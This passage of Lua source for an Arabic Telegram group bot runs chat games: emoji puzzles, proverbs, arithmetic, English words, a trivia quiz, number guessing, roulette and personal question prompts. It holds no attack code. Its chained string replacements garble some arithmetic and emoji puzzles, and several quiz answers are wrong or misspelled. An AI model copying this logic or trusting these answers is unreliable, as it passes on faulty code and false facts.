name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
VenomTEAM = '𖠧︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum4'..msg.chat_id_) and not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ المختلف للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and SourceCh(msg) or text == 'الامثله' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum5'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
VenomTEAM = '𖠧︙اكمل المثال التالي ↫ ['..name..']'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum5'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Venom..'Abs:GameNum5'..msg.chat_id_)
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ امثله للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and SourceCh(msg) or text == 'الرياضيات' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum6'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
VenomTEAM = '𖠧︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum6'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Venom..'Abs:GameNum6'..msg.chat_id_)
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and SourceCh(msg) or text == 'الانجليزيه' and SourceCh(msg) or text == 'انكليزيه' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum7'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
VenomTEAM = '𖠧︙ما معنى كلمة ↫ '..name
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum7'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Venom..'Abs:GameNum7'..msg.chat_id_)
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ انكليزيه للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end  
--     Source Venom     --
if text == 'اسئله' and SourceCh(msg) or text == 'اختيارات' and SourceCh(msg) or text == 'الاسئله' and SourceCh(msg) or text == 'اساله' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(Venom..'Abs:GameNum8'..msg.chat_id_,name)
DevAbs:del(Venom..'Abs:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','𖠧︙ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','𖠧︙ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','𖠧︙كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','𖠧︙كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','𖠧︙كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','𖠧︙من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','𖠧︙من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','𖠧︙ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','𖠧︙ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','𖠧︙ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','𖠧︙ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','𖠧︙ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','𖠧︙ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','𖠧︙اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','𖠧︙في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','𖠧︙على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','𖠧︙ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','𖠧︙اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','𖠧︙تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','𖠧︙كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','𖠧︙ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','𖠧︙ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','𖠧︙ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','𖠧︙ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','𖠧︙ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','𖠧︙ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','𖠧︙ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','𖠧︙ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','𖠧︙من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
VenomTEAM = name..'\n𖠧︙ارسل الجواب الصحيح فقط'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
return false
end end
if text == DevAbs:get(Venom..'Abs:GameNum8'..msg.chat_id_) then
if not DevAbs:get(Venom..'Abs:Games:Ids'..msg.chat_id_) then 
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(Venom..'Abs:GameNum8'..msg.chat_id_)
VenomTEAM = '𖠧︙مبروك لقد ربحت في اللعبه \n𖠧︙ارسل ↫ الاسئله للعب مره اخرى'
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md')
end
DevAbs:set(Venom..'Abs:Games:Ids'..msg.chat_id_,true)
end  
--     Source Venom     --
if DevAbs:get(Venom.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Abs(msg.chat_id_, msg.id_, 1,"𖠧︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevAbs:get(Venom.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevAbs:del(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(Venom.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙*التخمين الصحيح هو* ↫ '..NUM..'\n𖠧︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevAbs:incrby(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevAbs:get(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevAbs:del(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevAbs:del(Venom.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n𖠧︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevAbs:get(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevAbs:get(Venom..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and SourceCh(msg) or text == 'تخمين' and SourceCh(msg) then   
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevAbs:set(Venom.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n𖠧︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevAbs:setex(Venom.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Venom     --
if text == 'روليت' then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
DevAbs:del(Venom.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:del(Venom..'Abs:ListRolet'..msg.chat_id_)  
DevAbs:setex(Venom.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevAbs:get(Venom.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "𖠧︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevAbs:set(Venom.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '𖠧︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n𖠧︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevAbs:del(Venom.."Abs:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevAbs:get(Venom.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevAbs:sismember(Venom..'Abs:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'𖠧︙المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevAbs:sadd(Venom..'Abs:ListRolet'..msg.chat_id_,text)
local CountAdd = DevAbs:get(Venom.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevAbs:scard(Venom..'Abs:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevAbs:del(Venom.."Abs:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevAbs:setex(Venom.."Abs:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "𖠧︙تم ادخال المعرف ↫ ["..text.."]\n𖠧︙وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "𖠧︙تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     Source Venom     --
if text == 'كت تويت' and SourceCh(msg) or text == 'كت' and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
local VenomTEAM = {
'آخر مرة زرت مدينة الملاهي؟','آخر مرة أكلت أكلتك المفضّلة؟','الوضع الحالي؟\n‏1. سهران\n‏2. ضايج\n‏3. أتأمل','آخر شيء ضاع منك؟','كلمة أخيرة لشاغل البال؟','طريقتك المعتادة في التخلّص من الطاقة السلبية؟','شهر من أشهر العام له ذكرى جميلة معك؟','كلمة غريبة من لهجتك ومعناها؟🤓','‏- شيء سمعته عالق في ذهنك هاليومين؟','متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟','‏- أبرز صفة حسنة في صديقك المقرب؟','هل تشعر أن هنالك مَن يُحبك؟','اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟','أجمل شيء حصل معك خلال هاليوم؟','صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔','كلمة لشخص غالي اشتقت إليه؟💕','آخر خبر سعيد، متى وصلك؟','أنا آسف على ....؟','أوصف نفسك بكلمة؟','صريح، مشتاق؟','‏- صريح، هل سبق وخذلت أحدهم ولو عن غير قصد؟','‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭','‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤','‏- تخيّل شيء قد يحدث في المستقبل؟','‏- للشباب | آخر مرة وصلك غزل من فتاة؟🌚','شخص أو صاحب عوضك ونساك مُر الحياة ما اسمه ؟','| اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث شو راح تكون ؟.','كم مره تسبح باليوم','نسبة النعاس عندك حاليًا؟','لو فقط مسموح شخص واحد تتابعه فالسناب مين بيكون ؟','يهمك ملابسك تكون ماركة ؟','وش الشيء الي تطلع حرتك فيه و زعلت ؟','عندك أخوان او خوات من الرضاعة؟','عندك معجبين ولا محد درا عنك؟',
'أطول مدة قضيتها بعيد عن أهلك ؟','لو يجي عيد ميلادك تتوقع يجيك هدية؟','يبان عليك الحزن من " صوتك - ملامحك','وين تشوف نفسك بعد سنتين؟','وش يقولون لك لما تغني ؟','عندك حس فكاهي ولا نفسية؟','كيف تتصرف مع الشخص الفضولي ؟','كيف هي أحوال قلبك؟','حاجة تشوف نفسك مبدع فيها ؟','متى حبيت؟','شيء كل م تذكرته تبتسم ...','العلاقه السريه دايماً تكون حلوه؟','صوت مغني م تحبه','لو يجي عيد ميلادك تتوقع يجيك هدية؟','اذا احد سألك عن شيء م تعرفه تقول م اعرف ولا تتفلسف ؟','مع او ضد : النوم افضل حل لـ مشاكل الحياة؟','مساحة فارغة (..............) اكتب اي شيء تبين','اغرب اسم مر عليك ؟','عمرك كلمت فويس احد غير جنسك؟','اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟','لو عندك فلوس وش السيارة اللي بتشتريها؟','وش اغبى شيء سويته ؟','شيء من صغرك ماتغير فيك؟','وش نوع الأفلام اللي تحب تتابعه؟','وش نوع الأفلام اللي تحب تتابعه؟','تجامل احد على حساب مصلحتك ؟','تتقبل النصيحة من اي شخص؟','كلمه ماسكه معك الفترة هذي ؟','متى لازم تقول لا ؟','اكثر شيء تحس انه مات ف مجتمعنا؟','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','تؤمن ان في "حُب من أول نظرة" ولا لا ؟.','هل تعتقد أن هنالك من يراقبك بشغف؟','اشياء اذا سويتها لشخص تدل على انك تحبه كثير ؟','اشياء صعب تتقبلها بسرعه ؟','اقتباس لطيف؟','أكثر جملة أثرت بك في حياتك؟','عندك فوبيا من شيء ؟.',
'اكثر لونين تحبهم مع بعض؟','أجمل بيت شعر سمعته ...','سبق وراودك شعور أنك لم تعد تعرف نفسك؟','تتوقع فيه احد حاقد عليك ويكرهك ؟','أجمل سنة ميلادية مرت عليك ؟','لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟','وش تحس انك تحتاج الفترة هاذي ؟','يومك ضاع على؟','@منشن .. شخص تخاف منه اذا عصب ...','فيلم عالق في ذهنك لا تنساه مِن روعته؟','تختار أن تكون غبي أو قبيح؟','الفلوس او الحب ؟','أجمل بلد في قارة آسيا بنظرك؟','ما الذي يشغل بالك في الفترة الحالية؟','احقر الناس هو من ...','وين نلقى السعاده برايك؟','اشياء تفتخر انك م سويتها ؟','تزعلك الدنيا ويرضيك ؟','وش الحب بنظرك؟','افضل هديه ممكن تناسبك؟','كم في حسابك البنكي ؟','كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟','عمرك انتقمت من أحد ؟!','ما السيء في هذه الحياة ؟','غنية عندك معاها ذكريات🎵🎻','/','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أطول مدة نمت فيها كم ساعة؟','أصعب قرار ممكن تتخذه ؟','أفضل صفة تحبه بنفسك؟','اكثر وقت تحب تنام فيه ...','أنت محبوب بين الناس؟ ولاكريه؟','إحساسك في هاللحظة؟','اخر شيء اكلته ؟','تشوف الغيره انانيه او حب؟','اذكر موقف ماتنساه بعمرك؟','اكثر مشاكلك بسبب ؟','اول ماتصحى من النوم مين تكلمه؟','آخر مرة ضحكت من كل قلبك؟','لو الجنسية حسب ملامحك وش بتكون جنسيتك؟','اكثر شيء يرفع ضغطك','اذكر موقف ماتنساه بعمرك؟','لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .',
'كيف تشوف الجيل ذا؟','ردة فعلك لو مزح معك شخص م تعرفه ؟','احقر الناس هو من ...','تحب ابوك ولا امك','آخر فيلم مسلسل والتقييم🎥؟','أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟','كلمة لأقرب شخص لقلبك🤍؟','حط@منشن لشخص وقوله "حركتك مالها داعي"😼!','اذا جاك خبر مفرح اول واحد تعلمه فيه مين💃🏽؟','طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟','افضل ايام الاسبوع عندك🔖؟','يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة🏙؟','تاريخ لن تنساه📅؟','تحب الصيف والا الشتاء❄️☀️؟','شخص تحب تستفزه😈؟','شنو ينادونك وانت صغير (عيارتك)👼🏻؟','عقل يفهمك/ج ولا قلب يحبك/ج❤️؟','اول سفره لك وين رح تكون✈️؟','كم عدد اللي معطيهم بلوك👹؟','نوعية من الأشخاص تتجنبهم في حياتك❌؟','شاركنا صورة او فيديو من تصويرك؟📸','كم من عشره تعطي حظك📩؟','اكثر برنامج تواصل اجتماعي تحبه😎؟','من اي دوله انت🌍؟','اكثر دوله ودك تسافر لها🏞؟','مقولة "نكبر وننسى" هل تؤمن بصحتها🧓🏼؟','تعتقد فيه أحد يراقبك👩🏼‍💻؟','لو بيدك تغير الزمن ، تقدمه ولا ترجعه🕰؟','مشروبك المفضل🍹؟','‏قم بلصق آخر اقتباس نسخته؟💭','كم وزنك/ج طولك/ج؟🌚','كم كان عمرك/ج قبل ٨ سنين😈؟','دوله ندمت انك سافرت لها😁؟','لو قالو لك ٣ أمنيات راح تتحقق عالسريع شنو تكون🧞‍♀️؟','‏- نسبة احتياجك للعزلة من 10📊؟','شخص تحبه حظرك بدون سبب واضح، ردة فعلك🧐؟','مبدأ في الحياة تعتمد عليه 